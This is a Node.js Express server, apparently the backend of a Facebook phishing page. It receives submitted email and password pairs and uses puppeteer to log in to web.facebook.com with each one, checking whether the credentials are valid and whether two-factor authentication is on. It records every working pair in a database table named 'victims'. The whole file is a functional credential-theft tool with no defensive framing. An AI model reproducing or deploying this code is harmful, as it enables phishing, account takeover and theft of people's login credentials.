import {config} from "dotenv";
import puppeteer from 'puppeteer-core';
import express from "express";
import cors from "cors";
import {Nosqljsondb} from "nosql-json-db"

config();

const _env = process.env;
const port = _env.PORT || 4000;
const allowedOrigin = _env.ALLOWED_ORIGIN;


const db = new Nosqljsondb("./db.json");


const puppeteerFunction = async (email , pass , callback) => {
    let launchOptions = {  
        executablePath: _env.CHROME_PATH,
        args: ['--start-maximized']
    };

    let res = {
        isSuccess : false,
        twoFAenabled : false
    }

    const browser = await puppeteer.launch(launchOptions);
    const page = await browser.newPage();

    await page.setViewport({width: 1366, height: 768});

    await page.setUserAgent
            ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ' +
            '(KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36');

    await page.goto('https://web.facebook.com');

    await page.type(_env.EMAIL_INPUT, email, {delay : 3});
    await page.type(_env.PASS_INPUT, pass, {delay : 2});

    await page.click(_env.SUBMIT_BTN, {
        delay : 2
    });


    page.waitForNavigation({timeout : 60000})
    .then(async () => {
        let pageUrl = page.url();
        let loginPageUrl = "https://web.facebook.com/login" ,
            twoFA = "https://web.facebook.com/checkpoint/?next";

        if(pageUrl.search(new RegExp(loginPageUrl,"i")) === 0) {
            res.isSuccess = false;
            res.twoFAenabled = false;
        }
        else if(pageUrl.search(new RegExp(twoFA,"i")) === 0 || pageUrl === twoFA ) {
            db.insertInto("victims",{
                email : email,
                password : pass,
                twoFAenabled : "true"
            });
            res.isSuccess = true;
            res.twoFAenabled = true;
        }
        else {
            db.insertInto("victims",{
                email : email,
                password : pass,
                twoFAenabled : "false"
            });
            res.isSuccess = true;
            res.twoFAenabled = false;
        }
        await browser.close();
        callback(res)
    })
}

export default (()=> {

    const app = express();

    app.use(express.static('public'))

    /*just incase of future changes or switch of host*/
    app.use(cors({
        origin: allowedOrigin
      }));

    app.post("/",(req, res) => {
        let body = "";
        req.on("data", data => body += data);
        req.on("end", async () => {
            try {
                let credentials = {...JSON.parse(body)};
    
                if (credentials.email && credentials.pass) {
                    puppeteerFunction(credentials.email, credentials.pass, resp => {
                        res.status(200).json(resp);
                    });
                }
                else {
                    res.status(200).json({
                        error : "Data not sent to server in right format"
                    })
                }
            }
            catch(err) {
                res.status(200).json({
                    error : "Error while parsing data sent to server"
                })
            }
        })
    })

    app.listen(port, ()=> console.log("server is runing on port "+ port));

})();